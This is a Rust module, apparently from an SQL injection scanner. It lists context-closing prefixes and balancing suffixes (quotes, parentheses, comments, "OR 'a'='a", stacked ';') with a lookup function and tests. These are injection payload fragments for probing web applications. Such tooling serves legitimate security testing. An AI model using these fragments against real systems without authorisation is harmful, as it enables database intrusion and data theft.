//! Built-in SQL Injection Boundaries
//!
//! A boundary defines how to close the current SQL context before injecting.
//! Each boundary has a prefix (close) and suffix (balance) to maintain syntactic validity.

/// A context boundary: how to close the current SQL context before injecting.
#[derive(Debug, Clone)]
pub struct Boundary {
    /// Suffix appended to the original value to close its context.
    /// e.g. `'` closes a string, `)` closes a parenthesised expression.
    pub close: &'static str,
    /// Comment / balancing suffix to keep the query syntactically valid.
    /// e.g. `-- `, `#`, `AND 'x'='x`.
    pub balance: &'static str,
    /// Human-readable context label (for logging/evidence).
    pub label: &'static str,
}

/// Comprehensive boundary list — independently written.
/// Covers single-quote, double-quote, numeric, parenthesised, and
/// multi-level nesting contexts commonly found in real applications.
pub static BOUNDARIES: &[Boundary] = &[
    // ── Single-quote string ───────────────────────────────────────────────────
    Boundary {
        close: "'",
        balance: "-- ",
        label: "sq-comment",
    },
    Boundary {
        close: "'",
        balance: "#",
        label: "sq-hash",
    },
    Boundary {
        close: "'",
        balance: "/*",
        label: "sq-block",
    },
    Boundary {
        close: "'",
        balance: "AND 'a'='a",
        label: "sq-and-str",
    },
    Boundary {
        close: "'",
        balance: "OR 'a'='a",
        label: "sq-or-str",
    },
    // ── Single-quote with parenthesis ─────────────────────────────────────────
    Boundary {
        close: "')",
        balance: "-- ",
        label: "sq-paren",
    },
    Boundary {
        close: "')",
        balance: "#",
        label: "sq-paren-hash",
    },
    Boundary {
        close: "'))",
        balance: "-- ",
        label: "sq-dparen",
    },
    Boundary {
        close: "'))",
        balance: "#",
        label: "sq-dparen-hash",
    },
    Boundary {
        close: "'))",
        balance: "AND ('a'='a",
        label: "sq-dparen-and",
    },
    // ── Double-quote string ───────────────────────────────────────────────────
    Boundary {
        close: "\"",
        balance: "-- ",
        label: "dq-comment",
    },
    Boundary {
        close: "\"",
        balance: "#",
        label: "dq-hash",
    },
    Boundary {
        close: "\"",
        balance: "AND \"a\"=\"a",
        label: "dq-and-str",
    },
    Boundary {
        close: "\")",
        balance: "-- ",
        label: "dq-paren",
    },
    Boundary {
        close: "\"))",
        balance: "-- ",
        label: "dq-dparen",
    },
    // ── Numeric / unquoted ────────────────────────────────────────────────────
    Boundary {
        close: "",
        balance: "-- ",
        label: "num-comment",
    },
    Boundary {
        close: "",
        balance: "AND 1=1",
        label: "num-and",
    },
    Boundary {
        close: "",
        balance: "AND 1=1-- ",
        label: "num-and-comment",
    },
    Boundary {
        close: ")",
        balance: "-- ",
        label: "num-paren",
    },
    Boundary {
        close: "))",
        balance: "-- ",
        label: "num-dparen",
    },
    // ── Backtick (MySQL identifier context) ──────────────────────────────────
    Boundary {
        close: "`",
        balance: "-- ",
        label: "backtick",
    },
    // ── LIKE clause injection contexts ───────────────────────────────────────
    Boundary {
        close: "%'",
        balance: "AND '%'='",
        label: "like-sq",
    },
    Boundary {
        close: "%'",
        balance: "-- ",
        label: "like-sq-comment",
    },
    Boundary {
        close: "%\"",
        balance: "AND \"%\"=\"",
        label: "like-dq",
    },
    // ── IN clause injection contexts ──────────────────────────────────────────
    Boundary {
        close: ")",
        balance: "AND (1=1",
        label: "in-paren",
    },
    Boundary {
        close: ")",
        balance: "-- ",
        label: "in-paren-comment",
    },
    // ── ORDER BY injection contexts ───────────────────────────────────────────
    Boundary {
        close: "",
        balance: ",1) AND (1=1",
        label: "order-num",
    },
    Boundary {
        close: "",
        balance: "-- ",
        label: "order-comment",
    },
    // ── Stacked / multi-statement ────────────────────────────────────────────
    Boundary {
        close: "';",
        balance: "-- ",
        label: "sq-stack",
    },
    Boundary {
        close: "\";",
        balance: "-- ",
        label: "dq-stack",
    },
    Boundary {
        close: ";",
        balance: "-- ",
        label: "num-stack",
    },
];

/// Find a boundary by its label.
/// Also searches dynamic boundaries if the label starts with "dyn:".
pub fn find_boundary(label: &str) -> Option<(String, String)> {
    // First check built-in boundaries
    for b in BOUNDARIES {
        if b.label.eq_ignore_ascii_case(label) {
            return Some((b.close.to_string(), b.balance.to_string()));
        }
    }
    
    // Check for dynamic boundary reference (loaded from external sources)
    if label.starts_with("dyn:") {
        // Dynamic boundary lookup would require loading from cache
        // For now, return None - the caller should use PayloadDatabase::find_boundary
        return None;
    }
    
    None
}

/// Get all available built-in boundary labels.
pub fn available_labels() -> Vec<&'static str> {
    BOUNDARIES.iter().map(|b| b.label).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn find_sq_comment_boundary() {
        let result = find_boundary("sq-comment");
        assert!(result.is_some());
        let (close, balance) = result.unwrap();
        assert_eq!(close, "'");
        assert_eq!(balance, "-- ");
    }

    #[test]
    fn find_num_and_boundary() {
        let result = find_boundary("num-and");
        assert!(result.is_some());
        let (close, balance) = result.unwrap();
        assert_eq!(close, "");
        assert_eq!(balance, "AND 1=1");
    }

    #[test]
    fn find_unknown_boundary() {
        assert!(find_boundary("nonexistent").is_none());
    }

    #[test]
    fn available_labels_count() {
        let labels = available_labels();
        assert_eq!(labels.len(), BOUNDARIES.len());
        assert!(labels.contains(&"sq-comment"));
        assert!(labels.contains(&"num-and"));
    }
}
